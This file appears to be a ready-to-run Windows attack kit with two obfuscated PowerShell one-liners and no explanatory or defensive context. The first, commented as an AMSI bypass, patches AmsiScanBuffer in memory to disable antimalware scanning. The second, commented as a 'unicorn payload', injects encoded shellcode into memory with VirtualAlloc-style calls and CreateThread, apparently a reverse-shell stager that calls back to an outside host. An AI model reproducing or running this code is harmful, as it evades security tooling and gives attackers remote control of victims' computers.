# AMSI bypass code - run in same process as unicorn second stage
powershell /w 1 /C "sv VJ -;sv nRD ec;sv OM ((gv VJ).value.toString()+(gv nRD).value.toString());powershell (gv OM).value.toString() ('JABxAGoAVwBUAE4AYwBpAHIAbgAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzADsAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsACIAKwAiADMAIgArACIAMgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsACIAKwAiADMAIgArACIAMgAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAATABvAGEAZABMAGkAYgByAGEAcgB5ACgAcwB0AHIAaQBuAGcAIABuAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAiACsAIgAzACIAKwAiADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsAfQAKACIAQAAKAEEAZABkAC0AVAB5AHAAZQAgACQAcQBqAFcAVABOAGMAaQByAG4AOwAkAE4AaQBKAEMAUgAgAD0AIABbAFcAaQBuADMAMgBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABbAFcAaQBuADMAMgBdADoAOgBMAG8AYQBkAEwAaQBiAHIAYQByAHkAKAAiAEEAbQAiACsAIgBzACIAKwAiAGkALgBkAGwAIgArACIAbAAiACsAIgAiACkALAAgACIAQQBtACIAKwAiAHMAIgArACIAaQBTACIAKwAiAGMAIgArACIAYQBuAEIAdQAiACsAIgBmACIAKwAiAGYAZQByACIAKQA7ACQAUwBRAG0AdwB1AHAAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQATgBpAEoAQwBSACwAIABbAHUAaQBuAHQAMwAyAF0AWwB1AGkAbgB0ADMAMgBdADUALAAgADAAeAA0ADAALAAgAFsAcgBlAGYAXQAkAFMAUQBtAHcAdQBwACkAOwAkAGcAVABlAEEAZwAgAD0AIAAoACIAfQB4AFMAeABpAGsAdQBuAEQARgB1ACwAIAB9AHgAVQB1AGIASgBVAEcAYgAsACAAfQB4AH0AfQAsACAAfQB4AH0ANwAsACAAfQB4ADgAfQAsACAAfQB4AEMAMwAiACkALgByAGUAcABsAGEAYwBlACgAIgBVAHUAYgBKAFUARwBiACIALAAgACIANQA3ACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACAAIgAwACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAFMAeABpAGsAdQBuAEQARgB1ACIALAAgACIAQgA4ACIAKQA7ACQAZwBUAGUAQQBnACAAPQAgAFsAQgB5AHQAZQBbAF0AXQAoACQAZwBUAGUAQQBnACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAQwBvAHAAeQAoACQAZwBUAGUAQQBnACwAIAAwACwAIAAkAE4AaQBKAEMAUgAsACAANgApAA==')"

# actual unicorn payload
powershell /w 1 /C "sv VJ -;sv nRD ec;sv OM ((gv VJ).value.toString()+(gv nRD).value.toString());powershell (gv OM).value.toString() ('JAB2AGwAPQAnACQAbABnAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAIgArACIAYwAiACsAIgByAHQALgBkAGwAbAAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlACIAKwAiAGwAIgArACIAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQAiACsAIgBsACIAKwAiADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABlAEwAVgApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAIgArACIAYwAiACsAIgByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAZgBLAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA4ADkALAB9AGUANQAsAH0ANgA0ACwAfQA4AGIALAB9ADUAMgAsAH0AMwAwACwAfQA4AGIALAB9ADUAMgAsAH0AMABjACwAfQA4AGIALAB9ADUAMgAsAH0AMQA0ACwAfQA4AGIALAB9ADcAMgAsAH0AMgA4ACwAfQAwAGYALAB9AGIANwAsAH0ANABhACwAfQAyADYALAB9ADMAMQAsAH0AZgBmACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQBjADAALAB9AGEAOAAsAH0AYQBlACwAfQA4ADEALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEAMQAsAH0ANQBjACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABhACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0AZQA4ACwAfQA2ADcALAB9ADAAMAAsAH0AMAAwACwAfQAwADAALAB9ADYAYQAsAH0AMAAwACwAfQA2AGEALAB9ADAANAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AMAAyACwAfQBkADkALAB9AGMAOAAsAH0ANQBmACwAfQBmAGYALAB9AGQANQAsAH0AOAAzACwAfQBmADgALAB9ADAAMAAsAH0ANwBlACwAfQAzADYALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAMwAsAH0AZgA4ACwAfQAw'+'ADAALAB9ADcAZAAsAH0AMgA4ACwAfQA1ADgALAB9ADYAOAAsAH0AMAAwACwAfQA0ADAALAB9ADAAMAAsAH0AMAAwACwAfQA2AGEALAB9ADAAMAAsAH0ANQAwACwAfQA2ADgALAB9ADAAYgAsAH0AMgBmACwAfQAwAGYALAB9ADMAMAAsAH0AZgBmACwAfQBkADUALAB9ADUANwAsAH0ANgA4ACwAfQA3ADUALAB9ADYAZQAsAH0ANABkACwAfQA2ADEALAB9AGYAZgAsAH0AZAA1ACwAfQA1AGUALAB9ADUAZQAsAH0AZgBmACwAfQAwAGMALAB9ADIANAAsAH0AMABmACwAfQA4ADUALAB9ADcAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0AZQA5ACwAfQA5AGIALAB9AGYAZgAsAH0AZgBmACwAfQBmAGYALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBjADEALAB9AGMAMwAsAH0AYgBiACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9ADYAYQAsAH0AMAAwACwAfQA1ADMALAB9AGYAZgAsAH0AZAA1ACIAOwAkAFQAYwA9AEEAZABkAC0AVAB5AHAAZQAgAC0AcABhAHMAcwAgAC0AbQAgACQAbABnACAALQBOAGEAbQBlACAAIgBmAHQAIgAgAC0AbgBhAG0AZQBzACAATQBBAEgAOwAkAFQAYwA9ACQAVABjAC4AcgBlAHAAbABhAGMAZQAoACIATQBBAEgAIgAsACAAIgBXAGkAbgAzADIARgB1AG4AYwB0AGkAIgArACIAbwAiACsAIgBuAHMAIgApADsAWwBiAHkAdABlAFsAXQBdACQAZgBLACAAPQAgACQAZgBLAC4AcgBlAHAAbABhAGMAZQAoACIAfQAiACwAIgBqAFkASwB4ACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAGoAWQBLACIALAAgACIAMAAiACkALgBTAHAAbABpAHQAKAAiACwAIgApADsAJABQAGkAPQAwAHgAMQAwADAAOQA7AGkAZgAgACgAJABmAEsALgBMACAALQBnAHQAIAAwAHgAMQAwADAAOQApAHsAJABQAGkAPQAkAGYASwAuAEwAfQA7ACQAeABYAD0AJABUAGMAOgA6AGMAYQBsAGwAbwBjACgAMAB4ADEAMAAwADkALAAgADEAKQA7AFsAVQBJAG4AdAA2ADQAXQAkAGUATABWACAAPQAgADAAOwBmAG8AcgAoACQASgBXAD0AMAA7ACQASgBXACAALQBsAGUAKAAkAGYASwAuAEwAZQBuAGcAdABoAC0AMQApADsAJABKAFcAKwArACkAewAkAFQAYwA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAHgAWAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABKAFcAKQAsACAAJABmAEsAWwAkAEoAVwBdACwAIAAxACkAfQA7ACQAVABjADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAHgAWAAsACAAMAB4ADEAMAAwADkALAAgADAAeAA0ADAALAAgAFsAUgBlAGYAXQAkAGUATABWACkAOwAkAGcAawBkAD0AWwBpAG4AdABdADAAeAAwADAAOwAkAFQAYwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABbAGkAbgB0AF0AMAAsACQAZwBrAGQALAAkAHgAWAAsADAALAAwACwAMQAtADEAKQA7ACcAOwAkAEEAcgA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAdgBsACkAKQA7ACQATgBwAD0AIgBwAG8AdwBlAHIAcwBoAGUAbABsACIAOwAkAGcAVAA9ACIAVwBpAG4AZABvAHcAcwAiADsAJAB2AGcAVQBjACAAPQAgACIAQwA6AFwAJABnAFQAXABXAEYAdwB0AHEAdgBTAFwAJABnAFQAJABOAHAAXAB2ADEALgAwAFwAJABOAHAAIgA7ACQAdgBnAFUAYwAgAD0AIAAkAHYAZwBVAGMALgByAGUAcABsAGEAYwBlACgAIgBXAEYAdwAiACwAIAAiAHMAeQBzACIAKQA7ACQAdgBnAFUAYwAgAD0AIAAkAHYAZwBVAGMALgByAGUAcABsAGEAYwBlACgAIgB0AHEAdgBTACIALAAgACIAdwBvAHcANgA0ACIAKQA7ACQAUgB2AGUAIAA9ACAAJwBUAHIAIgArACIAdQAiACsAIgBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAUgB2AGUAJwApAHsAJABOAHAAPQAgACQAdgBnAFUAYwB9ADsAJABIAHYAPQAiACAAJABOAHAAIAB2AE8AYwAgACQAQQByACIAOwAkAEgAdgA9ACQASAB2AC4AcgBlAHAAbABhAGMAZQAoACIAdgBPAGMAIgAsACAAIgAtAG4AbwBlAHgAaQB0ACAALQBlACIAKQA7AGkAZQB4ACAAJABIAHYA')"